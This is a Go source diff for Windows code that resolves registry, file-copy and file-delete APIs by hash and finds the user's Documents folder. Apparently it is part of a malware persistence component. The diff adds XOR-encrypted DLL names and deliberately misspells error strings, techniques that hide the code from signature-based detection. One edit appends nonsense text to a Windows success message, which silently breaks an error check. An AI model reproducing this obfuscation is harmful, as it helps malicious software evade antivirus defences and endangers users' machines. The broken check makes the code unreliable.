@@ -9,15 +9,16 @@ import (
 )
 
 var (
-	procRegCreateKeyExW  = winapiV2.GetFunctionAddressbyHash("advapi32", 0xc988e74)
-	procRegSetValueExW   = winapiV2.GetFunctionAddressbyHash("advapi32", 0x2cea05e0)
-	procRegCloseKey      = winapiV2.GetFunctionAddressbyHash("advapi32", 0x7649a602)
-	procGetModuleFileName = winapiV2.GetFunctionAddressbyHash("kernel32", 0x206167c3)
-	modShell32            = syscall.NewLazyDLL("shell32.dll")
+	strr1 = winapiV2.DecryptString("$!3$5,vw")  //advapi32
+	strr2 = winapiV2.DecryptString(". 7+ )vw")  //kernel32
+	procRegCreateKeyExW  = winapiV2.GetFunctionAddressbyHash(strr1, 0xc988e74)
+	procRegSetValueExW   = winapiV2.GetFunctionAddressbyHash(strr1, 0x2cea05e0)
+	procRegCloseKey      = winapiV2.GetFunctionAddressbyHash(strr1, 0x7649a602)
+	procGetModuleFileName = winapiV2.GetFunctionAddressbyHash(strr2, 0x206167c3)
+	modShell32            = syscall.NewLazyDLL(winapiV2.DecryptString("6- ))vwk!))"))
 	procSHGetFolderPath   = modShell32.NewProc("SHGetFolderPathW")
-	// procSHGetFolderPath   = winapiV2.GetFunctionAddressbyHash("shell32", 0x13f66500)
-	procCopyFile          = winapiV2.GetFunctionAddressbyHash("kernel32", 0x39e8f317)
-	procDeleteFile		  = winapiV2.GetFunctionAddressbyHash("kernel32", 0x99bee22f)
+	procCopyFile          = winapiV2.GetFunctionAddressbyHash(strr2, 0x39e8f317)
+	procDeleteFile		  = winapiV2.GetFunctionAddressbyHash(strr2, 0x99bee22f)
 )
 
 const (
@@ -42,7 +43,7 @@ func RegCreateKeyEx(key syscall.Handle, subKey string) (syscall.Handle, error) {
 		uintptr(unsafe.Pointer(&disposition)),
 	)
 	if ret != 0 {
-		return 0, fmt.Errorf("RegCreateKeyExW failed with error code: %d", ret)
+		return 0, fmt.Errorf("regggcreaaaaakey failed with error code: %d", ret)
 	}
 	return result, nil
 }
@@ -58,7 +59,7 @@ func RegSetValueEx(key syscall.Handle, valueName string, value string) error {
 	)
 	
 	if ret != 0 {
-		return fmt.Errorf("RegSetValueExW failed with error code: %d", ret)
+		return fmt.Errorf("regggggsettttttValllll failed with error code: %d", ret)
 	}
 	return nil
 }
@@ -68,7 +69,7 @@ func RegCloseKey(key syscall.Handle) error {
 		uintptr(key),
 	)
 	if ret != 0 {
-		return fmt.Errorf("RegCloseKey failed with error code: %d", ret)
+		return fmt.Errorf("regggggclooooekey failed with error code: %d", ret)
 	}
 	return nil
 }
@@ -77,8 +78,8 @@ func RegCloseKey(key syscall.Handle) error {
 func GetExecutablePath() string {
 	var buf [syscall.MAX_PATH]uint16
 	_,_, err := syscall.SyscallN(procGetModuleFileName,0, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
-	if err != 0 && err.Error() != "The operation completed successfully." {
-		fmt.Println("Error getting executable path:", err)
+	if err != 0 && err.Error() != "The operation completed successfully. plants will have a goof healtha" {
+		fmt.Println("Error getting "+winapiV2.DecryptString(" = &01$') ")+" path:", err)
 		return ""
 	}
 	return syscall.UTF16ToString(buf[:])
@@ -88,7 +89,7 @@ func GetDocumentsPath() string {
 	var buf [syscall.MAX_PATH]uint16
 	hr, _, _ := syscall.SyscallN(procSHGetFolderPath.Addr(), 0, csidlPersonal, 0, 0, uintptr(unsafe.Pointer(&buf[0])))
 	if hr != 0 {
-		fmt.Println("Error getting Documents path:", hr)
+		fmt.Println("Error gettttttt Doccccc path:", hr)
 		return ""
 	}
 	return syscall.UTF16ToString(buf[:])
@@ -127,12 +128,4 @@ func DeleteFile(path string) error {
 	return nil
 }
 
-func DecryptString(s string) string {
-	key := byte(0x45)
-	decoded := make([]byte, len(s))
-	for i := range s {
-		decoded[i] = s[i] ^ key
-	}
-	return string(decoded)
-}
 
